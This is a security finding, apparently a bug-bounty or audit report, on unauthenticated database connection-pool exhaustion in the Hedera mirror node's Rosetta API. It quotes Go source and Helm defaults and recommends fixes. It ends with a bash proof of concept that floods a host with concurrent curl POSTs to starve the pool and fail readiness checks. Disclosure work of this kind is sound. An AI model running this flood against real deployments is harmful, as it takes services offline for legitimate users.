### Title
Unauthenticated DB Connection Pool Exhaustion via Concurrent Requests Starves Legitimate Queries

### Summary
The Rosetta API applies no in-process concurrency or rate limiting. An unauthenticated attacker can send enough concurrent requests to exhaust the `Pool.MaxOpenConnections` (default: 100) ceiling, causing all subsequent DB-backed requests ظ¤ including the readiness health check's internal `/network/status` call ظ¤ to block until they time out. This causes the Kubernetes readiness probe to fail, removing the pod from the load balancer and producing an externally-visible service partition.

### Finding Description

**Code path and root cause:**

`rosetta/app/config/types.go` lines 77ظô81 defines the pool bounds:
```go
type Pool struct {
    MaxIdleConnections int `yaml:"maxIdleConnections"`  // default 20
    MaxLifetime        int `yaml:"maxLifetime"`          // default 30 min
    MaxOpenConnections int `yaml:"maxOpenConnections"`   // default 100
}
```

`rosetta/app/db/db.go` lines 31ظô33 applies them directly to the `database/sql` pool:
```go
sqlDb.SetMaxIdleConns(dbConfig.Pool.MaxIdleConnections)
sqlDb.SetConnMaxLifetime(time.Duration(dbConfig.Pool.MaxLifetime) * time.Minute)
sqlDb.SetMaxOpenConns(dbConfig.Pool.MaxOpenConnections)
```

`rosetta/main.go` lines 217ظô227 builds the middleware chain ظ¤ only `MetricsMiddleware`, `TracingMiddleware`, and `CorsMiddleware` are applied. There is **no in-process rate limiting, no concurrency cap, and no per-IP connection limit**:
```go
metricsMiddleware := middleware.MetricsMiddleware(router)
tracingMiddleware := middleware.TracingMiddleware(metricsMiddleware)
corsMiddleware := server.CorsMiddleware(tracingMiddleware)
httpServer := &http.Server{
    Addr:              fmt.Sprintf(":%d", rosettaConfig.Port),
    Handler:           corsMiddleware,
    ...
}
```

`rosetta/app/middleware/health.go` lines 37ظô50 shows the readiness check calls `/network/status` via HTTP (which itself requires a DB connection from the same pool):
```go
{
    Name:  "network",
    Timeout: time.Second * 10,
    Check: checkNetworkStatus(rosettaConfig.Port),
},
```
And lines 85ظô97 show `checkNetworkStatus` issues a live `NetworkStatus` RPC that hits the DB.

**Exploit flow:**

1. Attacker sends 100 concurrent POST requests to any DB-backed endpoint (e.g., `/network/status`, `/block`, `/account/balance`).
2. Go's `database/sql` pool issues up to `MaxOpenConnections=100` connections; all 100 are held by attacker goroutines.
3. Each attacker request is held for up to `WriteTimeout=10s` (`rosetta/main.go` line 226) before the HTTP server drops it ظ¤ but the attacker simply re-issues requests to maintain saturation.
4. Any legitimate request that needs a DB connection blocks waiting for a free slot.
5. The Kubernetes readiness probe hits `/health/readiness`, which calls `checkNetworkStatus`, which issues a `/network/status` HTTP call that itself needs a DB connection. This blocks and exceeds the 10-second check timeout.
6. Kubernetes marks the pod `NotReady` and removes it from the Service endpoints.

**Why existing checks fail:**

- `statementTimeout=20s` (`rosetta/app/db/client.go` line 36) and `WriteTimeout=10s` limit per-connection hold time, but the attacker only needs to sustain ~100 concurrent requests (trivially achievable) to keep the pool continuously saturated.
- The Traefik `inFlightReq` (5 per IP) and `rateLimit` (10/s per host) middleware in `charts/hedera-mirror-rosetta/values.yaml` lines 152ظô160 would mitigate this, but `global.middleware` defaults to `false` (line 95), so this protection is **off by default**.
- The `postgres` health check (health.go line 42) opens its own connection outside the pool, so the DB itself stays reachable ظ¤ only the application-layer pool is exhausted, making the attack invisible to simple DB-level monitoring.

### Impact Explanation
With the pool fully saturated, all DB-backed Rosetta endpoints return timeouts or hang. The readiness probe fails, causing Kubernetes to stop routing traffic to the pod. If HPA has `minReplicas: 1` (the default in `charts/hedera-mirror-rosetta/values.yaml` line 110), a single pod being marked not-ready takes the entire Rosetta service offline. This constitutes a complete, externally-triggered service partition achievable without any credentials.

### Likelihood Explanation
The attack requires only the ability to send HTTP POST requests to the public Rosetta port (5700). No authentication, no special headers, no privileged access. Sustaining 100 concurrent connections is trivially achievable from a single machine or a small botnet. The attack is repeatable and cheap: the attacker simply loops POST requests. The default `global.middleware: false` means most deployments that follow the Helm chart defaults are unprotected at the application layer.

### Recommendation
1. **Enable the Traefik middleware by default**: Change `global.middleware` default to `true` in `charts/hedera-mirror-rosetta/values.yaml`.
2. **Add in-process concurrency limiting**: Wrap the router in a `golang.org/x/net/netutil`-style semaphore or use `http.MaxBytesReader` combined with a token-bucket middleware before DB access is attempted.
3. **Separate the health-check DB path**: Give the readiness health check its own dedicated DB connection (outside the shared pool) so pool exhaustion cannot cause false-negative readiness failures.
4. **Reduce `MaxOpenConnections`** to a value that leaves headroom for health-check queries, and set `db.SetMaxIdleConns` equal to `MaxOpenConnections` to prevent idle-connection churn from amplifying the attack surface.

### Proof of Concept
```bash
# Requires: curl, GNU parallel or xargs
# Target: Rosetta API at http://<host>:5700

BODY='{"network_identifier":{"blockchain":"Hedera","network":"mainnet"},"metadata":{}}'

# Step 1: Flood 120 concurrent /network/status requests (exceeds MaxOpenConnections=100)
for i in $(seq 1 120); do
  curl -s -o /dev/null -X POST http://<host>:5700/network/status \
    -H 'Content-Type: application/json' -d "$BODY" &
done

# Step 2: While flood is running, attempt a legitimate query ظ¤ it will hang/timeout
curl -m 5 -X POST http://<host>:5700/network/status \
  -H 'Content-Type: application/json' -d "$BODY"
# Expected: connection timeout or no response within 5 seconds

# Step 3: Check readiness probe ظ¤ will fail while pool is saturated
curl -m 12 http://<host>:5700/health/readiness
# Expected: HTTP 503 or timeout, causing Kubernetes to mark pod NotReady

wait
```
